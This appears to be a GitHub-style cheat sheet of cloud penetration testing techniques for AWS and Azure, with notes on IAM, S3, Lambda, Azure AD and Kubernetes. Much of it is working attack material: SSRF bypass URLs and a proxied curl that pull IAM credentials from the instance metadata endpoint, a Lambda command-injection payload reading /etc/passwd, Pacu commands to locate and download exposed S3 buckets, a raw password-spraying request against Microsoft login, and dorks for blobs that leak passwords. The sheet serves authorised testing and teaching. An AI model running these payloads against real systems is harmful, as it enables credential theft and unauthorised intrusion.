# cloud penetration testing
A curateinfrastrucd list of cloud pentesting resource, contains AWS, Azure, Google Cloud


# AWS
* AWS basic info
  * mapping workflow
     * infrastructure mapping
     * service / container mapping
     * subdomain enum
     * url/resource mapping
     * method enum
      ```
      aws network public-ip list -- table
      aws s3 ls --profile <profile name>
      ```
  * amazon ARN
    ```
     arn:partition:service:region:account-id:resource-type/resource-id
     arn:aws:iam::123456789012:user/Development/product_1234/*
    ```
   * amazon IAM
     * amazon identify and access management service
     * RBAC = role base access control
     * ABAC = Atribute base acces controll
     * IAM has user versioning : V1,V2,...
  * KMS 
    * key managment service
    * is not ephemeral like access key id and secret key id in IAM
    * use for data encrypt/decrypt S3

 
 ### Auth methods:
* Programmatic access - Access + Secret Key
   * Secret Access Key and Access Key ID for authenticating via scripts and CLI
* Management Console Access
   * Web Portal Access to AWS

### Recon:
* AWS Usage
   * Some web applications may pull content directly from S3 buckets
   * Look to see where web resources are being loaded from to determine if S3 buckets are being utilized
   * Burp Suite
   * Navigate application like you normally would and then check for any requests to:
      * https://[bucketname].s3.amazonaws.com
      * https://s3-[region].amazonaws.com/[OrgName]

### S3:
* Amazon Simple Storage Service (S3)
   * Storage service that is “secure by default”
   * Configuration issues tend to unsecure buckets by making them publicly accessible
   * Nslookup can help reveal region
   * S3 URL Format:
      * https://[bucketname].s3.amazonaws.com
      * https://s3-[region].amazonaws.com/[Org Name]
        * aws s3 ls s3://bucket-name-here --region 
        * aws s3api get-bucket-acl --bucket bucket-name-here
        * aws s3 cp readme.txt  s3://bucket-name-here --profile newuserprofile

### EBS Volumes:
* Elastic Block Store (EBS)
* AWS virtual hard disks
* Can have similar issues to S3 being publicly available
* Difficult to target specific org but can find widespread leaks

### EC2:
* Like virtual machines
* SSH keys created when started, RDP for Windows.
* Security groups to handle open ports and allowed IPs.

### AWS Instance Metadata URL
* Cloud servers hosted on services like EC2 needed a way to orient themselves because of how dynamic they are
* A “Metadata” endpoint was created and hosted on a non-routable IP address at 169.254.169.254
* Can contain access/secret keys to AWS and IAM credentials
* Server compromise or SSRF vulnerabilities might allow remote attackers to reach it
* IAM credentials can be stored here:
   * http://169.254.169.254/latest/meta-data/iam/security-credentials/
* Can potentially hit it externally if a proxy service (like Nginx) is being hosted in AWS.
   * curl --proxy vulndomain.target.com:80 http://169.254.169.254/latest/meta-data/iam/security-credentials/ && echo

### Other bypasses
* aws eks list-clusters | jq -rc '.clusters'
```
aws eks update-kubeconfig --name example
kubectl get secrets
```
* SSRF AWS Bypasses to access metadata endpoint.
```
Converted Decimal IP: http://2852039166/latest/meta-data/
IPV6 Compressed: http://[::ffff:a9fe:a9fe]/latest/meta-data/
IPV6 Expanded: http://[0:0:0:0:0:ffff:a9fe:a9fe]/latest/meta-data/
```

#### Interesting metadata instance urls:
```
http://instance-data
http://169.254.169.254
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/reservation-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access
http://169.254.169.254/latest/dynamic/instance-identity/document
```
 
 
 
 ### Find subdomains
 ```
assetfinder example.com
```
* Bruteforcing
```
python3 dnsrecon.py -d example.com -D subdomains-top1mil-5000.txt -t brt
```

* https://github.com/RhinoSecurityLabs/pacu
```
bash install.sh
python3 pacu.py
import_keys --all
ls
```

* AWS Bloodhound
  * https://github.com/lyft/cartography


 ### S3 attack
 
 * S3 Bucket Pillaging
  * GOAL: Locate Amazon S3 buckets and search them for interesting data
  * In this lab you will attempt to identify a publicly accessible S3 bucket hosted by an organization. After identifying it you will list out the contents of it and download the files hosted there.
```
~$ sudo apt-get install python3-pip
~$ git clone https://github.com/RhinoSecurityLabs/pacu
~$ cd pacu
~$ sudo bash install.sh
~$ sudo aws configure
~$ sudo python3 pacu.py

Pacu > import_keys --all
# Search by domain
Pacu > run s3__bucket_finder -d glitchcloud 
# List files in bucket
Pacu > aws s3 ls s3://glitchcloud
# Download files
Pacu > aws s3 sync s3://glitchcloud s3-files-dir
```
* S3 Code Injection
 * Backdoor JavaScript in S3 Buckets used by webapps 
 * In March, 2018 a crypto-miner malware was found to be loading on MSN’s homepage
 * This was due to AOL’s advertising platform having a writeable S3 bucket, which was being served by MSN
 * If a webapp is loading content from an S3 bucket made publicly writeable attackers can upload  malicious JS to get executed by visitors 
 * Can perform XSS-type attacks against webapp visitors
 * Hook browser with Beef

* Domain Hijacking
  * Hijack S3 domain by finding references in a webapp to S3 buckets that don’t exist anymore
  * Or… subdomains that were linked to an S3 bucket with CNAME’s that still exist
  * When assessing webapps look for 404’s to *.s3.amazonaws.com
  * When brute forcing subdomains for an org look for 404’s with ‘NoSuchBucket’ error 
  * Go create the S3 bucket with the same name and region 
  * Load malicious content to the new S3 bucket that will be executed when visitors hit the site
 
 ### AWS lambda
   * Welcome to serverless!!!!
   * AWS Lambda, essentially are short lived servers that run your function and provide you with output that can be then used in other applications or consumed by other endpoints.

* OS command Injection in Lambda
  * curl "https://API-endpoint/api/stringhere"

* For a md5 converter endpoint "https://API-endpoint/api/hello;id;w;cat%20%2fetc%2fpasswd"
* Steal creds via XXE or SSRF reading:
``` 
/proc/self/environ
# If blocked try to read other vars:
/proc/[1..20]/environ
 ```
 

 
 # AZURE

* Check if company is using Azure AD:
```
https://login.microsoftonline.com/getuserrealm.srf?login=username@COMPANY.onmicrosoft.com&xml=1
- If NameSpaceType is "Managed", the company uses Azure AD
```

* Auth methods:
  * Password Hash Synchronization
     * Azure AD Connect
     * On-prem service synchronizes hashed user credentials to Azure
     * User can authenticate directly to Azure services like O365 with their internal domain credential
  * Pass Through Authentication
     *  Credentials stored only on-prem
     * On-prem agent validates authentication requests to Azure AD
     * Allows SSO to other Azure apps without creds stored in cloud
  * Active Directory Federation Services (ADFS)
     * Credentials stored only on-prem
     * Federated trust is setup between Azure and on-prem AD to validate auth requests to the cloud
     * For password attacks you would have to auth to the on-prem ADFS portal instead of Azure endpoints
  * Certificate-based auth
     * Client certs for authentication to API
     * Certificate management in legacy Azure Service Management (ASM) makes it impossible to know who created a cert (persistence potential)
  * Conditional access policies
  * Long-term access tokens
     * Authentication to Azure with oAuth tokens
     * Desktop CLI tools that can be used to auth store access tokens on disk
  * Legacy authentication portals

### Recon:
* O365 Usage
   * https://login.microsoftonline.com/getuserrealm.srf?login=username@acmecomputercompany.com&xml=1
   * https://outlook.office365.com/autodiscover/autodiscover.json/v1.0/test@targetdomain.com?Protocol=Autodiscoverv1
* User enumeration on Azure can be performed at
   * Detect invalid users while password spraying with:
      * https://github.com/dafthack/MSOLSpray
   * For on-prem OWA/EWS you can enumerate users with timing attacks (MailSniper)

* Microsoft Azure Storage:
  * Microsoft Azure Storage is like Amazon S3
  * Blob storage is for unstructured data
  * Containers and blobs can be publicly accessible via access policies
  * Predictable URL’s at core.windows.net
     * storage-account-name.blob.core.windows.net
     * storage-account-name.file.core.windows.net
     * storage-account-name.table.core.windows.net
     * storage-account-name.queue.core.windows.net
  * The “Blob” access policy means anyone can anonymously read blobs, but can’t list the blobs in the container
  * The “Container” access policy allows for listing containers and blobs
  * Microburst https://github.com/NetSPI/MicroBurst


* Password Attacks
   * Password Spraying Microsoft Online (Azure/O365)
   ```
   POST /common/oauth2/token HTTP/1.1
   Accept: application/json
   Content-Type: application/x-www-form-urlencoded
   Host: login.microsoftonline.com
   Content-Length: 195
   Expect: 100-continue
   Connection: close

   resource=https%3A%2F%2Fgraph.windows.net&client_id=1b730954-1685-4b74-9bfd-
   dac224a7b894&client_info=1&grant_type=password&username=user%40targetdomain.com&passwor
   d=Winter2020&scope=openid
   ```
  * Password protections & Smart Lockout
    * https://github.com/ustayready/fireprox

* Interesting metadata instance urls:
```
http://169.254.169.254/metadata/v1/maintenance
http://169.254.169.254/metadata/instance?api-version=2017-04-02
http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
```
 
 
 
### Basic Azure AD concepts and tips
   * Source of authentication for Office 365, Azure Resource Manager, and anything else you integrate with it.
   * Azure AD principals
      * Users
      * Devices
      * Applications
   * Azure AD roles
     * RBAC Roles are only used for Azure Resource Manager
     * Office 365 uses administrator roles exclusively
   * Azure AD applications
       * Microsoft Graph

    
### Azure Block Blobs (S3 equivalent) attacks
   ``` 
   * Discovering with Google Dorks
   site:*.blob.core.windows.net
   site:*.blob.core.windows.net ext:xlsx | ext:csv "password"
   * Discovering with Dns enumeration
   python dnscan.py -d blob.core.windows.net -w subdomains-100.txt
```

 
### Cloud Labs
* AWS Labs 
   * https://github.com/OWASP/Serverless-Goat 
   * https://github.com/RhinoSecurityLabs/cloudgoat 
   * https://github.com/appsecco/attacking-cloudgoat2 
   * https://github.com/OWASP/DVSA 
* GCP Labs 
  * http://thunder-ctf.cloud/ https://gcpgoat.joshuajebaraj.com/
* Azure Labs 
   * https://github.com/azurecitadel/azure-security-lab
 
 
 
 
 
 
 ### CDN - Comain Fronting
* [FindFrontableDomains](https://github.com/rvrsh3ll/FindFrontableDomains)
* [Noctilucent](https://github.com/SixGenInc/Noctilucent)




## Docker Container
* Stateful instance of an image with a writable layer
* Contains everything needed to run your application

 
## Kubernetes
* Kubernetes is a security orchestrator
* Kubernetes master provides an API to interact with nodes
* Each Kubernetes node run kubelet to interact with API and kube-proxy to refect Kubernetes networking services on each node.
* Kubernetes objects are abstractions of states of your system.
* Pods: collection of container share a network and namespace in the same node.
* Services: Group of pods running in the cluster.
* Volumes: directory accesible to all containers in a pod. Solves the problem of loose info when container crash and restart.
* Namespaces: scope of Kubernetes objects, like a workspace (dev-space). 
 
 
 
 
 
 
#### refrences
* [SEC588: Cloud Penetration Testing](https://www.sans.org/cyber-security-courses/cloud-penetration-testing/)
* [cloud pentest](https://pentestbook.six2dez.com/enumeration/cloud/)
